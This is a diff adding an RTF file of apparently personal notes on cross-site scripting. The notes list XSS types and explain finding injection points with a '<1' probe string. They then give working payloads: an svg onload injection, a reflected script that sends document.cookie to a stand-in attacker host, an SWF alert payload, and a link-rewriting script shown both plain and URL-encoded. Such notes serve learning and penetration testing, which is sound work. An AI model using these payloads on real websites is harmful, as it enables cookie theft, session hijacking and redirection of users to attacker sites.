@@ -1,0 +1,126 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fnil\fcharset0 Menlo-Regular;\f2\fnil\fcharset0 Menlo-Bold;
+\f3\fnil\fcharset0 HelveticaNeue;\f4\fnil\fcharset0 Consolas;}
+{\colortbl;\red255\green255\blue255;\red52\green52\blue52;\red252\green24\blue39;\red38\green38\blue38;
+\red14\green14\blue14;\red234\green234\blue234;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww23520\viewh12500\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs32 \cf0 We have many different types of XSS\
+	1. Stored XSS\
+	2. Reflected XSS\
+	3. DOM XSS\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+To find XSS flaws we need to know where to look for it and how we can detect it. \
+Where to look for it is as simple as complicated: \
+	
+\b all we need is to probe every input the application has.
+\b0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\b \cf0 \ul \ulc0 PROCESS
+\b0 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\fs40 \cf2 \expnd0\expndtw0\kerning0
+\
+
+\fs32 We will do it using a probe string, a set of characters that we can look for it in source code in order to know if we can go further to inject a payload.\
+\
+Which is the most important single character for a XSS payload? \
+As we are dealing with HTML, the most important is the identifier of a tag: the less than sign \'93<\'94.\
+\
+Although there are injections which don\'92t need it, like an injection inside a tag without breaking it or one into the javascript section of the code, the tag based payloads work on all situations.\
+\
+If we inject a \'93<\'94 sign into any application input and we see it in the response of the web server, there\'92s a great chance to inject a payload. But it will be hard to spot only that char in source code (it\'92s everywhere), so we need something to help us to identify it. So we will use just another char after it:   <1\cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+Example\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf2 \expnd0\expndtw0\kerning0
+Probe
+\b0  \'97> http://domain/page?param1=
+\b 1<1
+\b0 &param2=
+\b 2<1
+\b0 \
+
+\b Source code
+\b0  \'97> <input type=\'93text\'94 value=\'93
+\b \cf3 2<1
+\b0 \cf2 \'94>\
+\
+We can quickly move to a full working payload like:\
+\
+
+\b Injection
+\b0  \'97> http://domain/page?param1=1&param2=
+\b \'94><svg+onload=\'93alert(1)
+\b0 \
+
+\b Source code
+\b0  \'97> <input type=\'93text\'94 value=\'93\cf3 \'94>
+\b <svg onload=
+\b0 \'93
+\b alert(1)
+\b0 \cf2 \'94>
+\fs40 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\fs32 \cf0 \kerning1\expnd0\expndtw0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul REFLECTED XSS
+\f1\b0\fs28 \expnd0\expndtw0\kerning0
+\ulnone \
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+Steal user\'92s cookie:\
+\
+www.welp.com?search=
+\f2\b <script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>
+\f3\b0 \
+\pard\pardeftab720\partightenfactor0
+\cf4 \
+
+\fs32 https://site.coms.swf?id=%5C%22));%7Dcatch(e)%&Balert(document.domain)%7D//\
+
+\fs28 \
+\pard\pardeftab720\partightenfactor0
+
+\f4\fs26 \cf5 \cb6 index.php?name=<script>window.onload = function() \{var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";\}</script>\
+\
+THE SAME AS\
+\
+index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e\
+\pard\pardeftab720\partightenfactor0
+
+\f3\fs28 \cf4 \cb1 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul \
+
+\b0 \ulnone \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+}
